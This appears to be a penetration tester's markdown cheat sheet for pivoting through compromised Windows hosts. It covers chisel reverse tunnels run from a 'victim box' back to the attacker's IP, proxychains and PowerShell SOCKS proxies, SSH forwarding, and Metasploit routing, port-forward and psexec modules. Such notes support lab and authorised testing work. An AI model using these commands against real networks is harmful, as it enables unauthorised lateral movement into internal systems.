# Windows pivoting

### Added nmap portable for linux systems to port scan.

### Chisel for Windows
https://github.com/jpillora/chisel/releases

```
Understanding => R:1234(Remote Port):127.0.0.1(localhost):1234(Local Port)


Victims Box: .\chisel.exe client <attackersIP>:8011 R:1234:127.0.0.1:1234
Attackers Box: .\chisel.exe server -p 8011 --reverse
```

### ippsec demonstration Proxychains
https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5446  

```
Configuring Proxychains:

vim /etc/proxychains.conf

comment proxy_dns
uncomment quiet_mode
remove any entries within proxy list
add socks5 127.0.0.1 1080

Setting up chisel:

attackers box: 
./chisel server -p 8000 --reverse

victims box:
.\chisel.exe client <attackersIP>:8000 R:8001:127.0.0.1:1337

victims box:
.\chisel.exe server -p 1337 --socks5

attackers box:
./chisel client 127.0.0.1:8001 socks

Testing proxychains command:

proxychains nmap -sT <TargetIP> -p445 -Pn
proxychains evil-winrm.rb -i <IP> -u user -p pass
```

### Standard Proxychains:  

https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29  

```
./chisel server -p 8080 --reverse

.\chisel.exe client <IP>:8080 R:socks

Edit Proxychains config file:
/etc/proxychains.conf

Add the following:
socks5 127.0.0.1 1080
```

### Using powershell to SOCKS Proxy (Thanks to @sinfulz for recommending this)
```
From Kali: Edit /etc/proxychains.conf, add "socks5 9080" at the bottom.
From Victim Box: Import-Module .\Invoke-SocksProxy.ps1
From Victim Box: Invoke-SocksProxy -bindPort 9080
From Kali: proxychains nmap -sT <target_IP> -Pn
```

### Port Forwarding using SSH
```
ssh -L <PORT>:127.0.0.1:<PORT> <USERNAME>@<REMOTE_ADDR>
ssh -L <PORT>:127.0.0.1:<PORT> <USERNAME>@<REMOTE_ADDR> -p 22
```

### routing through msf
```
run autoroute –s IP/24
use post/multi/manage/autoroute

socks proxy
use auxiliary/server/socks_proxy
```

### port forward through msf
```
Portfwd add -L 127.0.0.1 -l 445 -p 445 -r targetIP
portfwd add -L 127.0.0.1 -l 139 -p 139 -r targetIP
```

### route in metasploit

```
route add 192.168.1.0 255.255.255.0 1
```

### reverse proxy using msf and pivoting using psexec

```
server/socks5
set proxies socks5://127.0.0.1:1080
set ReverseAllowProxy true
windows/smb/psexec
```
